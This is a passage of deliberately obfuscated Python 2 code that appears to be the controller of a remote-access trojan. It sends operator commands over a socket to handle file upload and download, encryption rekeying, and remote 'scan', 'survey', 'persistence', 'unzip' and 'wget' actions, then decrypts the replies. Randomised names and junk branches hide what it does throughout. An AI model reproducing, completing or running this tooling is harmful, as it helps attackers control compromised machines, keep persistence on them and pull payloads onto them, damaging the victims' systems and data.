            yfAZIihiAQLsAeoWGMPaxKdqZNZUNVlhNARgsoivWObxLsdrmEpLjaGNmMSOYVtL = 'YZeBEoCHMRehttgZFGVmGiJZCvZzfGdQdNITGWjELTtLjBsrzmtFlbrrZleqwxvQ'
            BonDdClSSVKIAwOihOWaaeDXKLuPpFzlKvLRRoNWYFjOEQAslokrTzJUSkbVWMlq = 'ANjAfpjIMHZnEtyZyIWUDRreeRDHgxxBypvgJLHRckTHqzjjyszQscHEuPxaroar'
            fWXIwYRIKpsVWLOKJewOqpLiRfJtEvUAiuYrnlnyPisWKuDfySClKUtSUYvJkZtj = 'GUMfyqQKsnpuecUdDnpXcScwGJmWypmumwzwNfuBamCKXEVcUqzrpUzkIethUnzf'
            wQJfTmwfqoYVZChzlVjffwyPVHVCjlrWyOOrSyLAkmKWafeXqxLqhpHRamjlcQMa = 'MjrZSvOKITzphTFjYCJDWlNnXwUGfpYpqDdacoVVyyryPuQmUkVIuaGyyhllJPKi'
            XgjWrHrIMqWxjDQOclddhUIhoSDcGYBRVyjRHcLQwCKhczBNyWjGWUsSRawKjNEY = 'SKVEqVFhhYQqExDAmesPsLvZJrdKzhKcomOoPyydRUQwZoCFtuRnAJikRCBOQNxD'
            if BonDdClSSVKIAwOihOWaaeDXKLuPpFzlKvLRRoNWYFjOEQAslokrTzJUSkbVWMlq == fWXIwYRIKpsVWLOKJewOqpLiRfJtEvUAiuYrnlnyPisWKuDfySClKUtSUYvJkZtj:
                for XgjWrHrIMqWxjDQOclddhUIhoSDcGYBRVyjRHcLQwCKhczBNyWjGWUsSRawKjNEY in wQJfTmwfqoYVZChzlVjffwyPVHVCjlrWyOOrSyLAkmKWafeXqxLqhpHRamjlcQMa:
                    if XgjWrHrIMqWxjDQOclddhUIhoSDcGYBRVyjRHcLQwCKhczBNyWjGWUsSRawKjNEY == fWXIwYRIKpsVWLOKJewOqpLiRfJtEvUAiuYrnlnyPisWKuDfySClKUtSUYvJkZtj:
                        wQJfTmwfqoYVZChzlVjffwyPVHVCjlrWyOOrSyLAkmKWafeXqxLqhpHRamjlcQMa = XhRAyzlhvgQwFORKjMGKCdkjlwXtJZRGEIoXrfUJHMIvnXMtUQNoWXdjZJWSdKxp
                    else:
                        fWXIwYRIKpsVWLOKJewOqpLiRfJtEvUAiuYrnlnyPisWKuDfySClKUtSUYvJkZtj = yfAZIihiAQLsAeoWGMPaxKdqZNZUNVlhNARgsoivWObxLsdrmEpLjaGNmMSOYVtL
            for BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn in action.split():
                gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc = 'jiHQeIjvdVmWwaOSwktXocyIaXMrXuxvFdLeyqRedZDkactBlxTFSOBilJVGzZAF'
                QBXLnCUuPBXtsqEkjXGinwBthBonhwoOFicdpeHQTfRReuOXsJALRdiiXzyvsKmy = 'liTOTnviDOZNxGqtqQGpktFORiqggJHtDkAzuyWuwumuShZguTIQrYudlckEFoMT'
                OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY = 'QxPHSuPaIWYAXnUBzGGvEyYHxTLVKMebvJtZFqtCFvzobSjPMqrWXrxiMdMUKTlI'
                aOvmDUSKXQuzaWPWryTkslcpwcXUkamUKqoSnYyCLdjVxZXROTrYLxvtPTFENJOz = 'LbrpQZZGOuyRzTDyfbJRqfxWSdldjyMSmukkKFDYNloqJYoBGNvYYFImUlhIcwbf'
                HrKiDwnhcwqjKXqpHaXlvhsjejyVhSeEPwhPGfwSYnBnERqrHdLNAmaKTFhlyyIf = 'kALJRSqqTlVysAlltJVqBNPttKwCqOMQUWFFrappZUstgFnakKoCYWXGLcaUINFS'
                JBfFJWSDbHMPYqrJttBZQORRRHEGVEzRAmhlAFUXgCmTvAACsSddstLVXtCWFYeD = 'pDqbYlvNZXYCzdSbnOUdzmuYjysivINGCVBGyChecUyNjCZqtxBFaykSjmFrvHvU'
                if gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc != aOvmDUSKXQuzaWPWryTkslcpwcXUkamUKqoSnYyCLdjVxZXROTrYLxvtPTFENJOz:
                    QBXLnCUuPBXtsqEkjXGinwBthBonhwoOFicdpeHQTfRReuOXsJALRdiiXzyvsKmy = OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY
                    for JBfFJWSDbHMPYqrJttBZQORRRHEGVEzRAmhlAFUXgCmTvAACsSddstLVXtCWFYeD in aOvmDUSKXQuzaWPWryTkslcpwcXUkamUKqoSnYyCLdjVxZXROTrYLxvtPTFENJOz:
                        if JBfFJWSDbHMPYqrJttBZQORRRHEGVEzRAmhlAFUXgCmTvAACsSddstLVXtCWFYeD != OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY:
                            QBXLnCUuPBXtsqEkjXGinwBthBonhwoOFicdpeHQTfRReuOXsJALRdiiXzyvsKmy = QBXLnCUuPBXtsqEkjXGinwBthBonhwoOFicdpeHQTfRReuOXsJALRdiiXzyvsKmy
                        else:
                            HrKiDwnhcwqjKXqpHaXlvhsjejyVhSeEPwhPGfwSYnBnERqrHdLNAmaKTFhlyyIf = gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc
                else:
                    OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY = gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc
                    gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc = HrKiDwnhcwqjKXqpHaXlvhsjejyVhSeEPwhPGfwSYnBnERqrHdLNAmaKTFhlyyIf
                    if OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY == gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc:
                        for JBfFJWSDbHMPYqrJttBZQORRRHEGVEzRAmhlAFUXgCmTvAACsSddstLVXtCWFYeD in gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc:
                            if JBfFJWSDbHMPYqrJttBZQORRRHEGVEzRAmhlAFUXgCmTvAACsSddstLVXtCWFYeD == OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY:
                                OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY = gzrEIDjMbOCVPBONQylbthDQpGEoSGPjDIEEBxnttoaHhXOaVwoekfxGLKuohhkc
                            else:
                                OTCbXZEWTsMDDIntBLMZNbvCUVCxOegahyOSrKJvbmjykOSyhTDBqVZYOuhwkYrY = HrKiDwnhcwqjKXqpHaXlvhsjejyVhSeEPwhPGfwSYnBnERqrHdLNAmaKTFhlyyIf
                BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn = BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn.strip()
                FRoDRlsJIAlzmRsiLfnTwPbAAJhNPzLZiqmTHwMxrMnMNWnHWWCvyIklDxFOqKIe(POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI, BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'upload':
            lFxTvyJqYNMnQkiOIJUNCnTQfOJQazCxYzzcJXThHTZBZEdjqGtvopZfGugJCJAz = 'gSapBPfdpgtkgWfVXvtPHElZQvLMaSPRozOsPyKaWKkEJliGThMwFlXqAPfuvfEq'
            jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN = 'idwvzPjtuhxOhFFOyvJiqKRUKLSqmNHDKogxKqmVVWUlfKjXNoSgfkKgCQbesEkL'
            qNXkBLTcepIZIaWXRwdvwKyOxgzyeRBjxQUjASqaiJhvYhzFELVrruUHJUBogQGu = 'mDdqIdZODxkwwPtwlBOgiOyyTayurYqBiYrkDnCLSMYqtdyhjKMLCZbpvVZeviQc'
            PvJKDEjvJYcEjtUglHhpoaNWuggWpcHgwBJxMWjdJZZRwzdrHCYaeEFfgaXCjoBh = 'rCxELgCCqEjvLaKgBdYShfWcZecEgXGiVbICOXmMmMwetlPTDEdaoGAIFpTWCNzB'
            UapwXimSRvgdvwbVidwgbVQsRMlQmjKAZrOaODexWzhxVleasqVqEVZLYipmTWzL = 'LgHBGMIzhAXRRcJkPcBbCpFuwIDUoDxTWWmyyLfHQnTniSPQJQkqggsUayQouoMi'
            if lFxTvyJqYNMnQkiOIJUNCnTQfOJQazCxYzzcJXThHTZBZEdjqGtvopZfGugJCJAz in jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN:
                lFxTvyJqYNMnQkiOIJUNCnTQfOJQazCxYzzcJXThHTZBZEdjqGtvopZfGugJCJAz = UapwXimSRvgdvwbVidwgbVQsRMlQmjKAZrOaODexWzhxVleasqVqEVZLYipmTWzL
                if jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN in qNXkBLTcepIZIaWXRwdvwKyOxgzyeRBjxQUjASqaiJhvYhzFELVrruUHJUBogQGu:
                    jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN = PvJKDEjvJYcEjtUglHhpoaNWuggWpcHgwBJxMWjdJZZRwzdrHCYaeEFfgaXCjoBh
            elif jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN in lFxTvyJqYNMnQkiOIJUNCnTQfOJQazCxYzzcJXThHTZBZEdjqGtvopZfGugJCJAz:
                qNXkBLTcepIZIaWXRwdvwKyOxgzyeRBjxQUjASqaiJhvYhzFELVrruUHJUBogQGu = jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN
                if qNXkBLTcepIZIaWXRwdvwKyOxgzyeRBjxQUjASqaiJhvYhzFELVrruUHJUBogQGu in jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN:
                    jcxnAnMkYnuClDsKTUNojnGOtAkGafKBzpDpOJgfzIbdXIyYjCtzLJgGHBaAyjwN = UapwXimSRvgdvwbVidwgbVQsRMlQmjKAZrOaODexWzhxVleasqVqEVZLYipmTWzL
            for BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn in action.split():
                FglcUHzgHnDzoASzeIAyQUBjkZLwiJVRpMuldkibKhkiRJVnmdINDrhBmwtsFPAY = 'vGtXBXAmEVGMkbTOTyocYmyEgkVefwzZnByZmAibxUtiCNkYjoaGgwFaeCfJHIbZ'
                HhoLLAQwXqgMZEpTuZXGzpdALujJGsOOwSqNhFnnSYdZFrFVRkGQFNtddKCPslVe = 'SMWwaFMHKZTxvMTqONVqvwvuVDBOWLIvweusurzdsGuanISfEKwhkTxtpmPAuSse'
                WmaJOWGfjlQsNqpXFkCBouwIGpGGmmhohEzUUFAVbsZcqnAEbkRwsjwQQXdRcNud = 'YejUbkdffOxjRQQmZdFJdmAcDozezJeDrYELWnRQTapTuQezfMdvuPMbCJPDKhze'
                if FglcUHzgHnDzoASzeIAyQUBjkZLwiJVRpMuldkibKhkiRJVnmdINDrhBmwtsFPAY == HhoLLAQwXqgMZEpTuZXGzpdALujJGsOOwSqNhFnnSYdZFrFVRkGQFNtddKCPslVe:
                    eVYcBvkNeKiUDXXAhvhRclypCseDSqAzScjNFiewIePyFPHkYOYkFTINIyXJJAPP = 'DuABSGlYHXlFtNwwfdxdtsgnIEqjItxFsWGKoYTdyOFJcxrTncphnldhgDnLvDen'
                    eVYcBvkNeKiUDXXAhvhRclypCseDSqAzScjNFiewIePyFPHkYOYkFTINIyXJJAPP = FglcUHzgHnDzoASzeIAyQUBjkZLwiJVRpMuldkibKhkiRJVnmdINDrhBmwtsFPAY
                else:
                    eVYcBvkNeKiUDXXAhvhRclypCseDSqAzScjNFiewIePyFPHkYOYkFTINIyXJJAPP = 'DuABSGlYHXlFtNwwfdxdtsgnIEqjItxFsWGKoYTdyOFJcxrTncphnldhgDnLvDen'
                    eVYcBvkNeKiUDXXAhvhRclypCseDSqAzScjNFiewIePyFPHkYOYkFTINIyXJJAPP = WmaJOWGfjlQsNqpXFkCBouwIGpGGmmhohEzUUFAVbsZcqnAEbkRwsjwQQXdRcNud
                BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn = BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn.strip()
                gyEOxeZsdJwUGZYgHHjnAcyVnMSFdVEoTXtZeIXivuMhKxmmOUmZwswTamNUpaob(POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI, BZSjMIaWCcocIBPyALyzRFdetPtmWjtvDUWvEJgOkTAMqgQaCOmnBCHrIEgSGUgn, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ == 'rekey':
            HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV = 'lEeBbmxZwshbeYjVoVSVRfyzSXnWVQMuWrxhVVnshphUlaOKDjxaTZMWRlKBFAxe'
            ffemgMuDqpaqJesEYbfgJkWZpJyOKCeSYDLBRqhuSgEVFkAFHoWvFIuOnigOotCc = 'JxWNTCXOeVudgccOqLXRcYxOEExRaqKyAdImdyGOthKPJtmcKlHqxyuHQScUrUYO'
            pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB = 'WDcrUEPHxpOPZGAaCEQpwvJzRceSdNkJKseiboiIIuPbRXUxoepTCneCrCMSmZji'
            MVnwLiCcccfCQZgmBKcoAddXCFnaUnSUIUXHqHfSTcYmRpHnziCLQKgJnCVSLFIL = 'UmkTkZXskUlwpNhUxkilWzwovGlYrQzcCzckSqOSHYFmAJOixPfwzSMfTISWhLsS'
            WUVptJYChlkWIMzXvUAZSVlSsPfQODiHvpwJRAGrUPeKtNWLEzkTJlvuSjTBvIlP = 'RTksixtxzZdeChkzobmrkrxYJrJSbguluczYsdyDXwxiZuVOgswcgQzXmBHWAXUR'
            HdmTUlpnWYPIIznwKzOPiQYqPNQYLlTqvPdiNvhlhPMJoVpYoOHgYKQspZPdGiqA = 'bEKUnlwuXjigfqFwXmLmtohAGIFGhIINIyGqXJSYxIcIaXyxdRmWJndSPYDVcqYI'
            if HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV != MVnwLiCcccfCQZgmBKcoAddXCFnaUnSUIUXHqHfSTcYmRpHnziCLQKgJnCVSLFIL:
                ffemgMuDqpaqJesEYbfgJkWZpJyOKCeSYDLBRqhuSgEVFkAFHoWvFIuOnigOotCc = pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB
                for HdmTUlpnWYPIIznwKzOPiQYqPNQYLlTqvPdiNvhlhPMJoVpYoOHgYKQspZPdGiqA in MVnwLiCcccfCQZgmBKcoAddXCFnaUnSUIUXHqHfSTcYmRpHnziCLQKgJnCVSLFIL:
                    if HdmTUlpnWYPIIznwKzOPiQYqPNQYLlTqvPdiNvhlhPMJoVpYoOHgYKQspZPdGiqA != pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB:
                        ffemgMuDqpaqJesEYbfgJkWZpJyOKCeSYDLBRqhuSgEVFkAFHoWvFIuOnigOotCc = ffemgMuDqpaqJesEYbfgJkWZpJyOKCeSYDLBRqhuSgEVFkAFHoWvFIuOnigOotCc
                    else:
                        WUVptJYChlkWIMzXvUAZSVlSsPfQODiHvpwJRAGrUPeKtNWLEzkTJlvuSjTBvIlP = HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV
            else:
                pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB = HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV
                HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV = WUVptJYChlkWIMzXvUAZSVlSsPfQODiHvpwJRAGrUPeKtNWLEzkTJlvuSjTBvIlP
                if pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB == HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV:
                    for HdmTUlpnWYPIIznwKzOPiQYqPNQYLlTqvPdiNvhlhPMJoVpYoOHgYKQspZPdGiqA in HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV:
                        if HdmTUlpnWYPIIznwKzOPiQYqPNQYLlTqvPdiNvhlhPMJoVpYoOHgYKQspZPdGiqA == pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB:
                            pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB = HUesKKGAFhnagdlGNMBJVtAzuejAYCdIKTWPGimkSeuhLbpufqxkPNmhcgJNejVV
                        else:
                            pyLfeCKutmuZYYBJmRIiBjmvRMGOJhrIOGFPqNPsrQISWgJidwBcraUrHTJzEgBB = WUVptJYChlkWIMzXvUAZSVlSsPfQODiHvpwJRAGrUPeKtNWLEzkTJlvuSjTBvIlP
            WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz = ZnSlsMtPHuxZiZtdggZNNZbzlZGOKaVkpkTQLVelCtNuiCQWxtNSxMyhJZsAWbwr(POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI, xajyzlziGIBbeDZrDFPxZyRlmXKlrFomInKMTMtEtxtAtMXpyMdrQRsnnxAXXLLz=True)
        elif ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            LesFBiaWCfDatGWaddTsNVFFGgJvobmYaduWQHgtNXzUycYVzcicjWmOTgulZcjE = 'hsTVOZlZWAVPckjyKTcqpaWvLFJDyGKtaVqynxxGbbfmjsJNMtqbjIZMqzBLosKq'
            REDbqSoJwOYgKehCrzhCMCXesavXNfCzCiwcjujoTucRWJMZCavUqpLVPioAxXjN = 'rxcBdpDvjBTezmjmhztBuzrWqBTRDERskwbewNZMZXuIhEdqFwRiJzXdVgFMqDzD'
            JzIJRYflDxNgjJpNRdXprlmeQOeuYfNydEABymkPKPMSBjOUBulhorHkKJkfHoOL = 'rTMEkKifcPFWFupQWkXIdOBosWNhiQCZDsYMpzVpQOgWxtTmbwbnGDLzlcABOYAl'
            if LesFBiaWCfDatGWaddTsNVFFGgJvobmYaduWQHgtNXzUycYVzcicjWmOTgulZcjE == REDbqSoJwOYgKehCrzhCMCXesavXNfCzCiwcjujoTucRWJMZCavUqpLVPioAxXjN:
                NnaOmCuajejLNDwlWQUbPrsiOmUcqBzkmKKLOCmZxZSskHoHzxdkpuLkfTInVsAv = 'noZvLtQxZvaxkFCLIHiqZPeutquxQQzXhGJHbZZclnEAfAArHLZMqWQxJIQOGvvc'
                NnaOmCuajejLNDwlWQUbPrsiOmUcqBzkmKKLOCmZxZSskHoHzxdkpuLkfTInVsAv = LesFBiaWCfDatGWaddTsNVFFGgJvobmYaduWQHgtNXzUycYVzcicjWmOTgulZcjE
            else:
                NnaOmCuajejLNDwlWQUbPrsiOmUcqBzkmKKLOCmZxZSskHoHzxdkpuLkfTInVsAv = 'noZvLtQxZvaxkFCLIHiqZPeutquxQQzXhGJHbZZclnEAfAArHLZMqWQxJIQOGvvc'
                NnaOmCuajejLNDwlWQUbPrsiOmUcqBzkmKKLOCmZxZSskHoHzxdkpuLkfTInVsAv = JzIJRYflDxNgjJpNRdXprlmeQOeuYfNydEABymkPKPMSBjOUBulhorHkKJkfHoOL
            print 'Running {}...'.format(ryxOHojrcIHCThpRzvHycpuizOZbpAddaguNIexQZnhkseetpDYUwMWtCsGvUTgQ)
            klruDSSrtczBvSjeZdnKlRZApnUuTkWIihwXwUxxUQRcsjvUGnJRhJgKOEQUwsUS = POrWUgFUfVnmklKofNAoQFzJtmbYjDkiuCYHDPxrZURuFkDzDdfENVrppqVAnWPI.recv(1024)
            print gzbycLsDIoAAIdkKrPhXzOCBShxQOsZnySBSMqTNGnQftXQwITlzDOwUPzFObZoY(klruDSSrtczBvSjeZdnKlRZApnUuTkWIihwXwUxxUQRcsjvUGnJRhJgKOEQUwsUS, WrUuPzYKOYdtlInRkQYyVQVeVJdYkUPpiVDMFnRoFktTOxCYrteRaycUQJDibwLz)
if __name__ == '__main__':
    exYQsFrFUVqulLxcRzDKaDfGUOGghWlnxYjOEoHolpkiiXhfFEcheQeIaBoglFcw = 'nSIaSBnWnBpofqrJUhxFzatQIaRoNbxhxtEcnUAPNzVeyGezcePdMgzeWJYeqcmd'
    iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU = 'qxsUwbWdOKHKvWvFuQbdkjCTzJirmOzPlXqSVHEiOiikQFdmXZZygjgjMODEDYta'
    gKIaKVnOctBdXNYYXyiGKEEKaTHAZtebDCyyoIkIficfBqlvJvEUJiavZeSjOqEm = 'KAwoXAngXuwtbfpuUTePfVPVysNtOOLydihMdPzmvViFwRlDrEQdhSHbMaSuALie'
    tAPSrRNfsIQRFWDBmqQgQzzWGcSyUrsMsxVSODRZXZJvmvBfdpCQnvTctBsOxyHw = 'IjKhqejvZXHcyAYuHeHmBfAiCsjjsArwvPHlSTtEYgVqcESZFuVWYgFVMsUQaqTO'
    fpgaMRrrzeGhcWIwjczNXhDUWixHcLwLvoaOMcRMzlubNNaFhblQHVWAvyzMFwDh = 'rbQxfuvvNbufOICDPvahtBYBPXkztooLzgPZqtAmMQhdXOEusvnWWttQUdkxWIdv'
    if exYQsFrFUVqulLxcRzDKaDfGUOGghWlnxYjOEoHolpkiiXhfFEcheQeIaBoglFcw in iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU:
        exYQsFrFUVqulLxcRzDKaDfGUOGghWlnxYjOEoHolpkiiXhfFEcheQeIaBoglFcw = fpgaMRrrzeGhcWIwjczNXhDUWixHcLwLvoaOMcRMzlubNNaFhblQHVWAvyzMFwDh
        if iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU in gKIaKVnOctBdXNYYXyiGKEEKaTHAZtebDCyyoIkIficfBqlvJvEUJiavZeSjOqEm:
            iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU = tAPSrRNfsIQRFWDBmqQgQzzWGcSyUrsMsxVSODRZXZJvmvBfdpCQnvTctBsOxyHw
    elif iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU in exYQsFrFUVqulLxcRzDKaDfGUOGghWlnxYjOEoHolpkiiXhfFEcheQeIaBoglFcw:
        gKIaKVnOctBdXNYYXyiGKEEKaTHAZtebDCyyoIkIficfBqlvJvEUJiavZeSjOqEm = iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU
        if gKIaKVnOctBdXNYYXyiGKEEKaTHAZtebDCyyoIkIficfBqlvJvEUJiavZeSjOqEm in iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU:
            iAqBVTnzkAjywSWqRBHEKdZDjpSjiLmZykGuOUevolFjkOTVkcFEnjQzhsmUqSUU = fpgaMRrrzeGhcWIwjczNXhDUWixHcLwLvoaOMcRMzlubNNaFhblQHVWAvyzMFwDh
    dOGhSjWYUiVJKUTgWbiCcLCNdCryPxWCQlhMeeUtYSPigcbRaVADpWqZmMyDOJBu()
